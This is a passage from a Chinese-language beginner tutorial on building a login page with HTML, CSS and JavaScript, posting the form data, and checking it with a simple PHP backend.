class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;pd&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;passwords&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;bu&quot;</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中，可以看到笔者添加了几个<code>&lt;br/&gt;</code>，该元素为html中的换行符。<br>在<code>main.css</code>中添加:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#input_f</span> &#123;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">40vh</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">30vw</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，<code>#xxx&#123;&#125;</code>是css中的id选择器，<code>text-align:center;</code>是该div中子元素居中显示，<code>margin</code>解释过于长，请参考<a href="http://www.divcss5.com/rumen/r773.shtml">点我跳转</a>，<code>height</code>是该元素高度,<code>vh</code>和<code>vw</code>是一种单位，该值将屏幕可见长度和可见宽度分为<strong>100份</strong>，而<code>25vh</code>就等于25%的屏幕长度,<code>30vw</code>就等于30%的屏幕宽度，<strong>该单位在部署页面自适应的时候很常见</strong>。</p><h5 id="2-3-3-2-Step2-与页面上方距离"><a href="#2-3-3-2-Step2-与页面上方距离" class="headerlink" title="2.3.3.2 Step2 与页面上方距离"></a>2.3.3.2 Step2 与页面上方距离</h5><p>在<code>main.css</code>中更改<strong>id为input_f的选择器</strong>为:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#input_f</span> &#123;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">40vh</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">25vh</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">30vw</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，<code>margin-top</code>是该元素距离父元素顶部的距离，也就是设置<code>&lt;div id=&quot;input_f&quot;&gt;</code>顶部距离<code>&lt;html&gt;</code>顶部的距离。</p><h5 id="2-3-3-3-Step3-添加圆角边框"><a href="#2-3-3-3-Step3-添加圆角边框" class="headerlink" title="2.3.3.3 Step3 添加圆角边框"></a>2.3.3.3 Step3 添加圆角边框</h5><p>我们还可以为div添加边框,将<code>main.css</code>中input_f的选择器改为:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#input_f</span> &#123;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">40vh</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">25vh</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">30vw</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">2px</span> solid darkslategray;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">30px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中,border为边框设置，请参考<a href="https://www.runoob.com/css/css-border.html">点我跳转</a>。</p><h5 id="2-3-3-4-Step4-添加标题"><a href="#2-3-3-4-Step4-添加标题" class="headerlink" title="2.3.3.4 Step4 添加标题"></a>2.3.3.4 Step4 添加标题</h5><p>在<code>index.html</code>中<strong>id为um的input元素</strong>的上面添加:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;font-size: 3vw;&quot;</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中，<code>font-size</code>是设置文字大小。<br>至此，我们可以拥有一个和图片一样的登录页面:<br><img src="/images/%E4%BD%BF%E7%94%A8html+css+js%E5%88%B6%E4%BD%9C%E7%BD%91%E7%AB%99%E6%95%99%E7%A8%8B.md-9.jpg" alt="效果图"></p><h4 id="2-3-4-美化组件"><a href="#2-3-4-美化组件" class="headerlink" title="2.3.4 美化组件"></a>2.3.4 美化组件</h4><h5 id="BUTTON"><a href="#BUTTON" class="headerlink" title="BUTTON"></a>BUTTON</h5><p>默认的button按钮样式很不美观，笔者在此，引用<a href="https://blog.csdn.net/genius_yym/article/details/79670326">mcya的博客</a>的css样式，在<code>main.css</code>中添加:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#bu</span> &#123;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">5px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">15vw</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*以下来自https://blog.csdn.net/genius_yym/article/details/79670326 的博客，如有侵权，请联系删除*/</span></span><br><span class="line"><span class="selector-tag">button</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">    <span class="attribute">outline</span>: none;</span><br><span class="line">    <span class="attribute">cursor</span>: pointer;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="attribute">text-decoration</span>: none;</span><br><span class="line">    <span class="attribute">font</span>: <span class="number">14px</span>/<span class="number">100%</span> Arial, Helvetica, sans-serif;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">5px</span> <span class="number">2px</span> <span class="number">4px</span>;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">0</span> <span class="number">1px</span> <span class="number">1px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, .<span class="number">3</span>);</span><br><span class="line">    -webkit-<span class="attribute">border-radius</span>: <span class="number">5px</span>;</span><br><span class="line">    -moz-<span class="attribute">border-radius</span>: <span class="number">5px</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span><br><span class="line">    -webkit-<span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">1px</span> <span class="number">2px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, .<span class="number">2</span>);</span><br><span class="line">    -moz-<span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">1px</span> <span class="number">2px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, .<span class="number">2</span>);</span><br><span class="line">    <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">1px</span> <span class="number">2px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, .<span class="number">2</span>);</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#d9eef7</span>;</span><br><span class="line">    <span class="attribute">border</span>: solid <span class="number">1px</span> <span class="number">#0076a3</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#0095cd</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">-webkit-gradient</span>(linear, left top, left bottom, <span class="built_in">from</span>(<span class="number">#0095cc</span>), <span class="built_in">to</span>(<span class="number">#00678e</span>));</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">-moz-linear-gradient</span>(top, <span class="number">#00adee</span>, <span class="number">#00678e</span>);</span><br><span class="line">    <span class="attribute">filter</span>: progid:DXImageTransform.Microsoft.<span class="built_in">gradient</span>(startColorstr=<span class="string">&#x27;#00adee&#x27;</span>, endColorstr=<span class="string">&#x27;#00678e&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">button</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#007ead</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">-webkit-gradient</span>(linear, left top, left bottom, <span class="built_in">from</span>(<span class="number">#00678e</span>), <span class="built_in">to</span>(<span class="number">#0095cc</span>));</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">-moz-linear-gradient</span>(top, <span class="number">#00678e</span>, <span class="number">#0095cc</span>);</span><br><span class="line">    <span class="attribute">filter</span>: progid:DXImageTransform.Microsoft.<span class="built_in">gradient</span>(startColorstr=<span class="string">&#x27;#00678e&#x27;</span>, endColorstr=<span class="string">&#x27;#0095cc&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*结束*/</span></span><br></pre></td></tr></table></figure><p>其中，如有属性名不熟悉，可参考<a href="https://www.runoob.com/cssref/css-reference.html">点我跳转菜鸟教程</a>，<code>button:hover</code>为鼠标悬浮在button的元素上时，button元素的样式，<code>xxx&#123;&#125;</code>为元素选择器，选择全部button元素。</p><h5 id="2-3-4-1-INPUT"><a href="#2-3-4-1-INPUT" class="headerlink" title="2.3.4.1 INPUT"></a>2.3.4.1 INPUT</h5><p>把main.css中除了button（刚刚上面给的代码）都替换成:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#input_f</span> &#123;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">40vh</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">25vh</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">30vw</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">2px</span> solid darkslategray;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">30px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="built_in">rgb</span>(<span class="number">170</span>, <span class="number">169</span>, <span class="number">169</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">input</span> &#123;</span><br><span class="line">    <span class="attribute">outline-style</span>: none;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">3px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">0px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">20vw</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">3vw</span>;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">5px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#um</span> &#123;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">input</span><span class="selector-pseudo">:focus</span> &#123;<span class="comment">/*发光*/</span></span><br><span class="line">    <span class="attribute">border-color</span>: <span class="number">#66afe9</span>;</span><br><span class="line">    <span class="attribute">outline</span>: <span class="number">0</span>;</span><br><span class="line">    -webkit-<span class="attribute">box-shadow</span>: inset <span class="number">0</span> <span class="number">1px</span> <span class="number">1px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, .<span class="number">075</span>), <span class="number">0</span> <span class="number">0</span> <span class="number">8px</span> <span class="built_in">rgba</span>(<span class="number">102</span>, <span class="number">175</span>, <span class="number">233</span>, .<span class="number">6</span>);</span><br><span class="line">    <span class="attribute">box-shadow</span>: inset <span class="number">0</span> <span class="number">1px</span> <span class="number">1px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, .<span class="number">075</span>), <span class="number">0</span> <span class="number">0</span> <span class="number">8px</span> <span class="built_in">rgba</span>(<span class="number">102</span>, <span class="number">175</span>, <span class="number">233</span>, .<span class="number">6</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-4回顾"><a href="#2-4回顾" class="headerlink" title="2.4回顾"></a>2.4回顾</h3><p>至此，我们页面的渲染部分结束，我们使用了html+css的方式渲染页面，我们可以获得和下图一样的效果:<br><img src="/images/%E4%BD%BF%E7%94%A8html+css+js%E5%88%B6%E4%BD%9C%E7%BD%91%E7%AB%99%E6%95%99%E7%A8%8B.md-10.jpg" alt="效果图"></p><h3 id="2-5-JavaScript部分"><a href="#2-5-JavaScript部分" class="headerlink" title="2.5 JavaScript部分"></a>2.5 JavaScript部分</h3><h4 id="2-5-1-创建主js文件"><a href="#2-5-1-创建主js文件" class="headerlink" title="2.5.1 创建主js文件"></a>2.5.1 创建主js文件</h4><p>在<code>/www/js</code>文件夹下创建<code>main.js</code><br>然后在<code>index.html</code>中<code>&lt;head&gt;&lt;/head&gt;</code>里面添加:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/main.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-5-2-提交表单（通过POST方法）"><a href="#2-5-2-提交表单（通过POST方法）" class="headerlink" title="2.5.2 提交表单（通过POST方法）"></a>2.5.2 提交表单（通过POST方法）</h4><p>给在<code>index.html</code>的button添加onclick属性，绑定点击函数:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;bu&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;submit()&quot;</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><p>有关POST问题看<a href="https://www.w3school.com.cn/tags/html_ref_httpmethods.asp">这里</a>。</p><h5 id="2-5-2-1-纯js方式"><a href="#2-5-2-1-纯js方式" class="headerlink" title="2.5.2.1 纯js方式"></a>2.5.2.1 纯js方式</h5><p>此处部分代码引用于<a href="https://blog.csdn.net/Lianxingjie_1024/article/details/80238139">另外一个博客</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*此处代码为引用https://blog.csdn.net/Lianxingjie_1024/article/details/80238139的博客*/</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">post</span>(<span class="params">URL, PARAMS</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> temp = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;form&quot;</span>);</span><br><span class="line">    temp.<span class="property">action</span> = <span class="variable constant_">URL</span>;</span><br><span class="line">    temp.<span class="property">method</span> = <span class="string">&quot;post&quot;</span>;</span><br><span class="line">    temp.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&quot;none&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> x <span class="keyword">in</span> <span class="variable constant_">PARAMS</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> opt = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;textarea&quot;</span>);</span><br><span class="line">        opt.<span class="property">name</span> = x;</span><br><span class="line">        opt.<span class="property">value</span> = <span class="variable constant_">PARAMS</span>[x];</span><br><span class="line">        <span class="comment">// alert(opt.name)</span></span><br><span class="line">        temp.<span class="title function_">appendChild</span>(opt);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(temp);</span><br><span class="line">    temp.<span class="title function_">submit</span>();</span><br><span class="line">    <span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//代码引用结束</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">submit</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">var</span> um=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;um&quot;</span>).<span class="property">value</span>;<span class="comment">//根据 Id获得对象中的值</span></span><br><span class="line"><span class="keyword">var</span> pd=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;pd&quot;</span>).<span class="property">value</span>;<span class="comment">//根据 Id获得对象中的值</span></span><br><span class="line"><span class="keyword">var</span> rt=<span class="title function_">post</span>(<span class="string">&#x27;接收文件&#x27;</span>, &#123;<span class="attr">password</span>:pd,<span class="attr">username</span>:um&#125;);</span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;提交成功，&quot;</span>+rt);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，有关post问题参考原博客，有关取值问题参考<a href="https://www.cnblogs.com/arealy/p/10233220.html">这里</a></p><h5 id="2-5-2-2-JQ方法"><a href="#2-5-2-2-JQ方法" class="headerlink" title="2.5.2.2 JQ方法"></a>2.5.2.2 JQ方法</h5><p>先于<code>index.html</code>中的<code>&lt;head&gt;&lt;/head&gt;</code>里面添加:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span></span></span><br><span class="line"><span class="tag">  <span class="attr">src</span>=<span class="string">&quot;https://code.jquery.com/jquery-3.4.1.min.js&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">integrity</span>=<span class="string">&quot;sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">crossorigin</span>=<span class="string">&quot;anonymous&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>来引入jq，然后在<code>main.js</code>中添加</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">submit</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">var</span> um=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;um&quot;</span>).<span class="property">value</span>;</span><br><span class="line"><span class="keyword">var</span> pd=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;pd&quot;</span>).<span class="property">value</span>;</span><br><span class="line">$.<span class="title function_">post</span>(<span class="string">&quot;接收文件&quot;</span>,&#123;</span><br><span class="line"><span class="attr">username</span>:um,</span><br><span class="line"><span class="attr">password</span>:pd</span><br><span class="line"></span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span>(<span class="params">data,status</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;数据: \n&quot;</span> + data + <span class="string">&quot;\n状态: &quot;</span> + status);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有关ajax post参考<a href="https://baijiahao.baidu.com/s?id=1621600925778526737&wfr=spider&for=pc">这里</a>，其中，本次教程暂无接收php(教程已补<a href="https://blog.csdn.net/qq_40832960/article/details/104132721">点我跳转</a>)</p><h5 id="2-5-2-3-表单"><a href="#2-5-2-3-表单" class="headerlink" title="2.5.2.3 表单"></a>2.5.2.3 表单</h5><p>或者，我们可以把整个作为一个表单提交，在<code>index.html</code>中修改<code>input_f</code>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;input_f&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;接收php的地址&quot;</span> <span class="attr">type</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;um&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;username&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;pd&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;passwords&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;bu&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">input</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样也可以达到一样的效果。</p><h3 id="2-6-参考网站"><a href="#2-6-参考网站" class="headerlink" title="2.6 参考网站"></a>2.6 参考网站</h3><p><a href="https://www.runoob.com/">菜鸟教程</a><br><a href="https://www.w3school.com.cn/">w3school</a><br><strong>本文代码包<a href="https://github.com/Nambers/LoginHTML">github下载</a></strong></p><h2 id="3-制作php后端"><a href="#3-制作php后端" class="headerlink" title="3 制作php后端"></a>3 制作php后端</h2><blockquote><p>建议不再用php, 用python flash, go 还有很多其他的框架可以替换<br>建议不再用php, 用python flash, go 还有很多其他的框架可以替换<br>建议不再用php, 用python flash, go 还有很多其他的框架可以替换</p></blockquote><h3 id="3-1-基础"><a href="#3-1-基础" class="headerlink" title="3.1  基础"></a>3.1  基础</h3><p>PHP是什么？<br>PHP即“超文本预处理器”，是一种通用开源脚本语言。</p><p>PHP一般用来做什么？<br>我们一般把这种语言用于后台处理数据，或者在前端生成数据。本文主要讲php如何作为后端。</p><p>PHP作为后端时怎么和前端（html）通讯？<br>一般使用post方法进行通讯。</p><p>在服务器上或者本地使用php必须先要安装php，参考<a href="https://www.php.cn/php-weizijiaocheng-390592.html">点我跳转</a></p><h3 id="3-2-php语法"><a href="#3-2-php语法" class="headerlink" title="3.2  php语法"></a>3.2  php语法</h3><p>php的源文件后缀是<code>.php</code>，主要结构：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//php必须以&lt;?php开头?&gt;结尾</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;a&quot;</span>;<span class="comment">//这是一个变量</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;<span class="comment">//输出a，在页面上面显示a</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>其中，php可以和html混用，即:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>My first PHP page<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">echo &quot;Hello World!&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>代码详细参考<a href="https://www.runoob.com/php/php-syntax.html">链接</a><br>PHP相关参考<a href="https://www.runoob.com/php/php-tutorial.html">链接</a></p><h3 id="3-3-例子"><a href="#3-3-例子" class="headerlink" title="3.3 例子"></a>3.3 例子</h3><p>下面的代码处理了本系列上一章的数据。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$um</span>=<span class="variable">$_POST</span>[<span class="string">&quot;um&quot;</span>];<span class="comment">//我是账号</span></span><br><span class="line"><span class="variable">$pd</span>=<span class="variable">$_POST</span>[<span class="string">&quot;pd&quot;</span>];<span class="comment">//我是密码</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$um</span>==<span class="string">&quot;账号&quot;</span>&amp;&amp;<span class="variable">$pd</span>==<span class="string">&quot;密码&quot;</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;验证成功&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;失败&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>其中，如果post过来的账号和密码都正确，返回值为<code>“验证成功”</code>，如错误，则为<code>“失败”</code>。</p><h2 id="4-使用python-flask框架作为后端"><a href="#4-使用python-flask框架作为后端" class="headerlink" title="4 使用python flask框架作为后端"></a>4 使用python flask框架作为后端</h2><h3 id="4-1-准备"><a href="#4-1-准备" class="headerlink" title="4.1. 准备"></a>4.1. 准备</h3><h4 id="4-1-1-python"><a href="#4-1-1-python" class="headerlink" title="4.1.1 python"></a>4.1.1 